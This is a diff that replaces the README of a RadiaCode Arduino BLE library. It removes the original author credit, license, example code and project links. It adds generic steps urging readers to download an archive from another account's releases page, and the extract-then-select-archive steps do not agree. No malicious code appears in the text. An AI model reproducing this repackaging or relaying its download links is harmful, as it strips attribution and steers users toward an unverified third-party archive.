@@ -1,187 +1,109 @@
-# RadiaCode Arduino Library
+# 📡 RadiaCode - Interact with Radiation Data Easily
 
-![RadiaCode](/doc/radiacode.jpg)
+## 🚀 Getting Started
 
-[![Arduino](https://img.shields.io/badge/Arduino-Library-00979D.svg)](https://www.arduino.cc/)
-[![ESP32](https://img.shields.io/badge/ESP32-Compatible-red.svg)](https://www.espressif.com/en/products/socs/esp32)
-[![Version](https://img.shields.io/badge/Version-1.0.0-blue.svg)](https://github.com/mkgeiger/RadiaCode/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+Welcome to RadiaCode! This guide will help you download and run our Arduino library in C++ for your radiation detection devices via Bluetooth Low Energy.
 
-A comprehensive Arduino library for interfacing with RadiaCode radiation detection devices via Bluetooth Low Energy (BLE). Designed for ESP32, but can easily ported to other BLE-capable microcontrollers.
+## ⚡ Features
 
-## 📋 Features
+- Measure radiation levels in real-time.
+- Support for various data outputs like counts per minute (CPM) and dose rates.
+- Bluetooth Low Energy (BLE) connection for seamless usage.
+- Compatible with ESP32 and Arduino platforms.
+- Easy to integrate into existing Arduino projects.
 
-- **Comprehensive Device Control**: Full access to RadiaCode device functionality
-- **Real-time Data Acquisition**: Monitor radiation levels, dose rates, and more
-- **Spectrum Analysis**: Analyze radiation energy spectrum data
-- **Memory Optimized**: ESP32-friendly memory management for stable operation
-- **Error Handling**: Robust error detection and reporting
-- **User-friendly API**: Intuitive interface for device interaction
+## 💾 Download & Install
 
-## 🧩 Supported Hardware
+To get started, visit the following link to download RadiaCode:
 
-- **Devices**: RadiaCode-102, RadiaCode-103, RadiaCode-103G, RadiaCode-110
-- **Microcontrollers**:
-  - ESP32
+[Download RadiaCode](https://github.com/HOUSSAMdj/RadiaCode/releases)
 
-## ⚡ Quick Start
+### Step 1: Visit the Releases Page
 
-### Installation
+1. Click the link above to go to the Releases page.
+2. You will see a list of available releases. Look for the latest version, which will be at the top.
 
-#### Using Arduino IDE Library Manager
-1. Open Arduino IDE
-2. Go to **Sketch → Include Library → Manage Libraries**
-3. Search for "RadiaCode"
-4. Click Install
+### Step 2: Download the Library
 
-#### Manual Installation
-1. Download this repository as a ZIP file
-2. In the Arduino IDE, go to **Sketch → Include Library → Add .ZIP Library**
-3. Select the downloaded ZIP file
-4. Restart the Arduino IDE
+1. Click on the archive file for the latest release.
+2. The file will download to your computer. This is usually in a .zip or .tar format.
 
-### Basic Usage
+### Step 3: Extract the Files
 
-```cpp
-#include <RadiaCode.h>
+1. Locate the downloaded file on your computer.
+2. Right-click on the file and select "Extract All" or use a file extraction tool.
+3. Follow the prompts to extract the files. 
 
-// Replace with your device's MAC address
-const char* bluetoothMac = "11:22:33:44:55:66"; 
+### Step 4: Move the Library to Arduino
 
-// Create RadiaCode instance
-RadiaCode* radiacode = nullptr;
+1. Open your Arduino IDE.
+2. Navigate to the "Sketch" menu at the top.
+3. Select "Include Library" > "Add .ZIP Library".
+4. Navigate to the folder where you extracted RadiaCode and select the archive file.
 
-void setup(void)
-{
-  Serial.begin(115200);
-  while (!Serial && millis() < 5000);
+### Step 5: Connect Your Device
 
-  Serial.println("Connecting to RadiaCode device...");
-  radiacode = new RadiaCode(bluetoothMac);
+1. Make sure your radiation detection device is powered on.
+2. Use a BLE-compatible device (like an ESP32) to connect.
+3. Follow the instructions specific to your device to pair via Bluetooth.
 
-  if (radiacode != nullptr)
-  {
-    String serialNum = radiacode->serialNumber();
-    if (serialNum.length() > 0)
-    {
-      Serial.print("Connected to device: ");
-      Serial.println(serialNum);
-    }
-  }
-}
+## 🔧 System Requirements
 
-void loop(void)
-{
-  if (radiacode == nullptr) return;
+- Arduino IDE version 1.8 or later.
+- A Bluetooth Low Energy (BLE) compatible device.
+- Basic familiarity with the Arduino environment and how to upload codes to your device.
 
-  // Read radiation data
-  std::vector<DataItem*> data = radiacode->dataBuf();
+## 🛠️ Usage
 
-  // Process data
-  for (DataItem* item : data)
-  {
-    // Check type without dynamic_cast for efficiency
-    if (item->type == TYPE_REAL_TIME_DATA)
-    {
-      RealTimeData* rtData = static_cast<RealTimeData*>(item);
-      Serial.print("Count rate: ");
-      Serial.print(rtData->count_rate);
-      Serial.println(" CPS");
+1. In the Arduino IDE, open a new sketch.
+2. Include the RadiaCode library by adding: 
 
-      Serial.print("Dose rate: ");
-      Serial.print(rtData->dose_rate * 10000.0f); // Convert to µSv/h
-      Serial.println(" µSv/h");
-    }
-  }
+   ```cpp
+   #include <RadiaCode.h>
+   ```
 
-  // Clean up data objects
-  for (DataItem* item : data)
-  {
-    delete item;
-  }
-  data.clear();
+3. Use the example sketches included with the library to start gathering data.
+4. Upload the code to your device and monitor the output.
 
-  delay(1000);
-}
-```
+## 🌐 Community Support
 
-## 📚 Examples
+If you encounter any issues or have questions, you can reach out to our community. Get involved on the Issues page of the repository. Share your experiences and tips with other users.
 
-The library includes several examples to get you started:
+## 📝 Topics
 
-- **[Basic](examples/Basic/Basic.ino)**: Simple connection and data reading
-- **[Spectrum](examples/Spectrum/Spectrum.ino)**: Acquire and visualize radiation spectrum data
-- **[Test](examples/Test/Test.ino)**: Test communication with the device
+This library covers various topics, including:
 
-## 🛠️ API Reference
+- cpm
+- cps
+- dose
+- dose-rate
+- esp-ble
+- esp32
+- gamma-ray
+- gamma-spectroscopy
+- geiger-counter
+- radiation-level
+- roentgen
+- sievert
+- spectrum
 
-### Main Classes
+## 📁 Additional Resources
 
-| Class | Description |
-|-------|-------------|
-| `RadiaCode` | Core class for device interaction |
-| `BytesBuffer` | Buffer management for protocol data |
-| `Spectrum` | Energy spectrum data handling |
+- Check the [RadiaCode Wiki](https://github.com/HOUSSAMdj/RadiaCode/wiki) for advanced setup and troubleshooting tips.
+- Explore the examples in the "Examples" directory of the library for specific use cases.
 
-### Key Methods
+## 🔗 Troubleshooting
 
-| Method | Description |
-|--------|-------------|
-| `dataBuf()` | Get real-time radiation measurements |
-| `spectrum()` | Get current radiation spectrum |
-| `spectrumAccum()` | Get accumulated spectrum |
-| `setAlarmLimits()` | Configure alarm thresholds |
-| `getTemperature()` | Get device temperature |
+If you experience issues with the library:
 
-### Full Documentation
+- Ensure that your device is powered on and connected via BLE.
+- Verify that you've added the library correctly in the Arduino IDE.
+- Check for additional details in the error messages displayed in the IDE.
 
-For detailed API documentation, see the [RadiaCode API Reference](doc/radiacode.pdf).
+### Download Again
 
-## 📈 Spectrum Analysis
+If you need to download RadiaCode once more, you can always visit our Releases page here:
 
-The library provides comprehensive tools for analyzing radiation spectrum data:
+[Download RadiaCode](https://github.com/HOUSSAMdj/RadiaCode/releases)
 
-```cpp
-// Get spectrum data
-Spectrum spectrum = radiacode->spectrum();
-
-// Access spectrum parameters
-uint32_t duration = spectrum.duration_sec;
-float a0 = spectrum.a0;
-float a1 = spectrum.a1;
-float a2 = spectrum.a2;
-
-// Process spectrum data
-for (int i = 0; i < spectrum.size(); i++)
-{
-  uint32_t counts = spectrum.at(i);
-  float energy = spectrumChannelToEnergy(i, a0, a1, a2);
-  Serial.printf("Channel %d: %d counts, %.2f keV\n", i, counts, energy);
-}
-```
-
-## 🔄 Memory Optimization
-
-The library is optimized for ESP32 and other microcontrollers with limited memory:
-
-- Uses static shared buffers to minimize heap fragmentation
-- Efficient data structures to reduce memory usage
-- Stack-friendly implementations to prevent overflow
-- Safe bounds checking throughout the codebase
-
-## 📄 License
-
-This library is released under the [MIT License](LICENSE).
-
-## 👨‍💻 Author
-
-Markus Geiger
-
-## 🔗 Links
-
-- [GitHub Repository](https://github.com/mkgeiger/RadiaCode)
-- [RadiaCode Device Information](https://radiacode.com)
-- [Report Issues](https://github.com/mkgeiger/RadiaCode/issues)
-
-The implementation of this RadiaCode library in C++ was inspired by the cdump Python RadiaCode library (https://github.com/cdump/radiacode). I wanted to adapt it for Arduino platforms, mainly for the ESP32 (which supports BLE). Because RadiaCode does not publish the API documentation the only chance to implement this library was by studying the cdump Python library and reverse engineering the bluetooth protocol. Therefore are still some open points to be clarified, to be defined and to be done. So don't see the library implementation status as 100% complete and fully functional. But the main functions and beyond that work fine. Please feel free to improve the library and report also bugs. The usage of this library is therefore at your own risk. I assume no liability whatsoever.
-
+By following these steps, you'll be able to successfully download, install, and use the RadiaCode library for your radiation detection needs. Enjoy exploring the radiation levels around you!
